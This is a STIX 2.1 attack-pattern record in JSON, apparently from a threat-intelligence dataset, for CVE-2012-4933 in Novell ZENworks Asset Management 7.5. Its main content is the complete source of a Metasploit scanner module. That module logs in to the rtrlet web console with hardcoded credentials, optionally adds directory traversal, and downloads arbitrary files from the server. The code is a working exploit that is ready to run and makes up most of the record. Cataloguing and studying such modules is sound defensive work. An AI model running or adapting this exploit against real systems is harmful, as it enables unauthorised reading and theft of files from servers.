{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e9046642-7449-4282-a022-e4d71f481d8c",
    "created": "2024-08-14T16:28:50.255559Z",
    "modified": "2024-08-14T16:28:50.255562Z",
    "name": "Novell ZENworks Asset Management 7.5 Remote File Access",
    "description": " This module exploits a hardcoded user and password for the GetFile maintenance task in Novell ZENworks Asset Management 7.5. The vulnerability exists in the Web Console and can be triggered by sending a specially crafted request to the rtrlet component allowing a remote unauthenticated user to retrieve a maximum of 100_000_000 KB of remote files. This module has been successfully tested on Novell ZENworks Asset Management 7.5.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/zenworks_assetmanagement_fileaccess.rb",
            "external_id": "zenworks_assetmanagement_fileaccess.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-4933"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2012/10/11/cve-2012-4933-novell-zenworks/\t\t\t\t"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Novell ZENworks Asset Management 7.5 Remote File Access',\n      'Description'    => %q{\n          This module exploits a hardcoded user and password for the GetFile maintenance\n        task in Novell ZENworks Asset Management 7.5. The vulnerability exists in the Web\n        Console and can be triggered by sending a specially crafted request to the rtrlet component,\n        allowing a remote unauthenticated user to retrieve a maximum of 100_000_000 KB of\n        remote files. This module has been successfully tested on Novell ZENworks Asset\n        Management 7.5.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'juan vazquez' # Also the discoverer\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2012-4933' ],\n          [ 'URL', 'https://www.rapid7.com/blog/post/2012/10/11/cve-2012-4933-novell-zenworks/' ]\t\t\t\t]\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n        OptBool.new('ABSOLUTE', [ true, 'Use an absolute file path or directory traversal relative to the tomcat home', true ]),\n        OptString.new('FILEPATH', [true, 'The name of the file to download', 'C:\\\\WINDOWS\\\\system32\\\\drivers\\\\etc\\\\hosts']),\n        OptInt.new('DEPTH', [false, 'Traversal depth if absolute is set to false', 1])\n      ])\n  end\n\n  def run_host(ip)\n    # No point to continue if no filename is specified\n    if datastore['FILEPATH'].nil? or datastore['FILEPATH'].empty?\n      print_error(\"Please supply the name of the file you want to download\")\n      return\n    end\n\n    post_data = \"kb=100000000&\"\n    if datastore['ABSOLUTE']\n      post_data << \"file=#{datastore['FILEPATH']}&\"\n      post_data << \"absolute=yes&\"\n    else\n      travs = \"../\" * (datastore['DEPTH'] || 1)\n      travs << \"/\" unless datastore['FILEPATH'][0] == \"\\\\\" or datastore['FILEPATH'][0] == \"/\"\n      travs << datastore['FILEPATH']\n      post_data << \"file=#{travs}&\"\n      post_data << \"absolute=no&\"\n    end\n    post_data << \"maintenance=GetFile_password&username=Ivanhoe&password=Scott&send=Submit\"\n\n    print_status(\"#{rhost}:#{rport} - Sending request...\")\n    res = send_request_cgi({\n      'uri'          => '/rtrlet/rtr',\n      'method'       => 'POST',\n      'data'         => post_data,\n    }, 5)\n\n    if res and res.code == 200 and res.body =~ /Last 100000000 kilobytes of/ and res.body =~ /File name/ and not res.body =~ /<br\\/>File not found.<br\\/>/\n      print_good(\"#{rhost}:#{rport} - File retrieved successfully!\")\n      start_contents = res.body.index(\"<pre>\") + 7\n      end_contents = res.body.rindex(\"</pre>\") - 1\n      if start_contents.nil? or end_contents.nil?\n        print_error(\"#{rhost}:#{rport} - Error reading file contents\")\n        return\n      end\n      contents = res.body[start_contents..end_contents]\n      fname = File.basename(datastore['FILEPATH'])\n      path = store_loot(\n        'novell.zenworks_asset_management',\n        'application/octet-stream',\n        ip,\n        contents,\n        fname\n      )\n      print_status(\"#{rhost}:#{rport} - File saved in: #{path}\")\n    else\n      print_error(\"#{rhost}:#{rport} - Failed to retrieve file\")\n      return\n    end\n  end\nend\n"
}